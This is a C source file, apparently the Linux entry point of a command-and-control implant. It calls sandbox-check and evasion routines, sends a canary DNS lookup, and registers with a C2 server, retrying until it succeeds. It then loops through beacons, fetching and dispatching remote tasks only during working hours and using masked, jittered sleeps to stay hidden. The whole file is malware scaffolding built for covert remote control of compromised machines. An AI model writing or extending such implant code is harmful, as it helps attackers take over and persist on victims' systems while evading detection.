/* agent_linux.c — Linux entry point for the C agent.
 * Replaces the WinMain entry in agent.c for Linux builds. */
#ifndef _WIN32

#include "platform.h"
#include "transport.h"
#include "commands.h"
#include "evasion.h"
#include "config.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>

/* api_init() is a Windows-only function (PEB walk).  Provide a no-op stub. */
void api_init(void) {}

int main(void) {
    /* Ignore SIGPIPE so broken connections don't kill the process */
    signal(SIGPIPE, SIG_IGN);

    /* No sandbox check / evasion on Linux (stubs in evasion.h) */
    sandbox_check();
    evasion_init();

    /* Canary DNS lookup (fire-and-forget, no WSA needed on Linux) */
    if (AGENT_CANARY_DOMAIN[0] != '\0') {
        struct addrinfo hints = {0}, *res = NULL;
        char canary[256];
        snprintf(canary, sizeof(canary), "canary.%s", AGENT_CANARY_DOMAIN);
        getaddrinfo(canary, NULL, &hints, &res);
        if (res) freeaddrinfo(res);
    }

    /* Register with C2 — retry on failure */
    while (!agent_register()) {
        sleep_masked(30000UL);
    }

    /* Main beacon loop */
    for (;;) {
        if (!in_working_hours()) {
            sleep_until_work_hours();
            continue;
        }

        int count = 0;
        AgentTask *tasks = agent_beacon(&count);
        for (int i = 0; i < count; i++) {
            dispatch_task(&tasks[i]);
        }
        tasks_free(tasks, count);

        screenwatch_tick();    /* no-op on Linux */
        sleep_masked(sleep_ms_jitter());
    }

    return 0;
}

#endif /* !_WIN32 */
